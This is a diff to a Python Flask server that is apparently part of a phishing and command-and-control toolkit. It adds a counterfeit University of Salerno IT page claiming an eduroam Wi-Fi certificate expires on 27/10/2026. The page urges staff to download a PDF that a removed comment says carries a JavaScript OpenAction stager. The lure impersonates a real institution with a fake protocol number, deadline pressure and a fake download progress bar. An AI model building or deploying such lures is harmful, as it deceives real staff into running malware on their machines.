@@ -291,10 +291,18 @@ def phishing_zip():
 @app.route('/comunicazione', methods=['GET'])
 @app.route('/document', methods=['GET'])
 def phishing_pdf():
-    """Serve il PDF con JS OpenAction → stager (vettore alternativo all'xlsm)"""
+    """Landing page eduroam con download automatico del PDF"""
     pdf_path = Path(__file__).parent / 'phishing' / 'UnisaDocument.pdf'
     if not pdf_path.exists():
         return "Not found — esegui prima: python3 phishing/create_pdf_stager.py", 404
+    return render_template_string(LANDING_EDUROAM)
+
+@app.route('/comunicazione/download', methods=['GET'])
+def phishing_pdf_download():
+    """Download diretto del PDF"""
+    pdf_path = Path(__file__).parent / 'phishing' / 'UnisaDocument.pdf'
+    if not pdf_path.exists():
+        return "Not found", 404
     return send_file(str(pdf_path), as_attachment=True,
                      download_name='Comunicazione_Segreteria_UNISA.pdf',
                      mimetype='application/pdf')
@@ -349,6 +357,120 @@ def api_results(aid):
             return jsonify([])
         return jsonify(agents[aid]['results'])
 
+
+# ══════════════════════════════════════════════════════════════════════
+# LANDING PAGE EDUROAM — mostrata su /comunicazione
+# ══════════════════════════════════════════════════════════════════════
+
+LANDING_EDUROAM = """
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aggiornamento Certificato Wi-Fi eduroam — UNISA</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: #f4f6f9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+         color: #1a1a1a; min-height: 100vh; }
+  .header { background: #003087; color: #fff; padding: 18px 0; text-align: center;
+            border-bottom: 4px solid #C8A000; }
+  .header h1 { font-size: 22px; font-weight: 600; letter-spacing: 0.5px; }
+  .header p { font-size: 13px; opacity: 0.85; margin-top: 4px; }
+  .container { max-width: 680px; margin: 36px auto; padding: 0 20px; }
+  .card { background: #fff; border-radius: 10px; box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+          padding: 36px 32px; }
+  .card h2 { color: #003087; font-size: 19px; margin-bottom: 16px;
+             border-bottom: 2px solid #C8A000; padding-bottom: 10px; }
+  .card p { font-size: 14px; line-height: 1.7; color: #333; margin-bottom: 12px; }
+  .warn-box { background: #fdf2f2; border: 1px solid #c0392b; border-radius: 6px;
+              padding: 14px 18px; margin: 20px 0; text-align: center; }
+  .warn-box strong { color: #c0392b; font-size: 14px; }
+  .steps { margin: 20px 0; padding-left: 0; list-style: none; counter-reset: step; }
+  .steps li { position: relative; padding: 10px 0 10px 44px; font-size: 14px;
+              border-bottom: 1px solid #eee; counter-increment: step; }
+  .steps li:last-child { border-bottom: none; }
+  .steps li::before { content: counter(step); position: absolute; left: 0; top: 8px;
+                      width: 30px; height: 30px; background: #003087; color: #fff;
+                      border-radius: 50%; text-align: center; line-height: 30px;
+                      font-size: 13px; font-weight: bold; }
+  .btn-download { display: block; width: 100%; background: #1a7f37; color: #fff;
+                  border: none; border-radius: 8px; padding: 16px; font-size: 16px;
+                  font-weight: 600; cursor: pointer; text-align: center;
+                  text-decoration: none; margin: 24px 0 12px 0; transition: background .2s; }
+  .btn-download:hover { background: #15692d; }
+  .note { font-size: 12px; color: #888; text-align: center; margin-top: 8px; }
+  .footer { text-align: center; padding: 24px; font-size: 12px; color: #888; }
+  .footer a { color: #003087; text-decoration: none; }
+  .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #fff;
+             border-top-color: transparent; border-radius: 50%;
+             animation: spin 0.8s linear infinite; vertical-align: middle; margin-right: 8px; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .progress-bar { height: 4px; background: #e0e0e0; border-radius: 2px; margin-top: 16px;
+                  overflow: hidden; display: none; }
+  .progress-bar .fill { height: 100%; width: 0; background: #1a7f37;
+                        transition: width 2s ease-in-out; border-radius: 2px; }
+</style>
+</head>
+<body>
+<div class="header">
+  <h1>Universita degli Studi di Salerno</h1>
+  <p>Servizi Informatici di Ateneo — Rete Wi-Fi eduroam</p>
+</div>
+<div class="container">
+  <div class="card">
+    <h2>Aggiornamento Certificato Wi-Fi eduroam</h2>
+    <p>Gentile Collega,</p>
+    <p>il certificato di autenticazione IEEE 802.1x associato alla Sua utenza per la rete
+       Wi-Fi <strong>eduroam</strong> e in fase di scadenza. Per continuare ad accedere
+       alla rete wireless nei campus di Fisciano e Baronissi, e necessario procedere
+       all'aggiornamento del certificato.</p>
+
+    <div class="warn-box">
+      <strong>Scadenza: 27/10/2026 ore 23:59 — L'accesso Wi-Fi verra sospeso dopo il termine</strong>
+    </div>
+
+    <p><strong>Procedura di aggiornamento:</strong></p>
+    <ol class="steps">
+      <li>Scaricare il documento di comunicazione ufficiale cliccando il pulsante sottostante</li>
+      <li>Aprire il file PDF e seguire le istruzioni per avviare il configuratore automatico</li>
+      <li>Il certificato verra rinnovato automaticamente senza modificare le credenziali CAU</li>
+    </ol>
+
+    <a class="btn-download" id="download-btn" href="/comunicazione/download">
+      Scarica Comunicazione Ufficiale (PDF)
+    </a>
+    <div class="progress-bar" id="progress"><div class="fill" id="progress-fill"></div></div>
+    <p class="note">Documento PDF firmato digitalmente — Prot. UNISA/SIA/WIFI/2026/10/2198</p>
+    <p class="note">Per assistenza: <a href="https://hd.unisa.it" style="color:#003087">hd.unisa.it</a>
+       — Servizio "Reti" → Categoria "Rete Wi-Fi"</p>
+  </div>
+</div>
+<div class="footer">
+  <p>Universita degli Studi di Salerno — Via Giovanni Paolo II, 132 — 84084 Fisciano (SA)</p>
+  <p style="margin-top:4px">
+    <a href="https://www.unisa.it">www.unisa.it</a> &nbsp;|&nbsp;
+    <a href="https://wifi.unisa.it">wifi.unisa.it</a> &nbsp;|&nbsp;
+    helpdesk@unisa.it
+  </p>
+</div>
+<script>
+document.getElementById('download-btn').addEventListener('click', function(e) {
+  var btn = this;
+  var bar = document.getElementById('progress');
+  var fill = document.getElementById('progress-fill');
+  btn.innerHTML = '<span class="spinner"></span>Download in corso...';
+  bar.style.display = 'block';
+  setTimeout(function() { fill.style.width = '100%'; }, 100);
+  setTimeout(function() {
+    btn.innerHTML = 'Download completato';
+    btn.style.background = '#003087';
+  }, 2500);
+});
+</script>
+</body>
+</html>
+"""
 
 # ══════════════════════════════════════════════════════════════════════
 # DASHBOARD WEB (invariata)
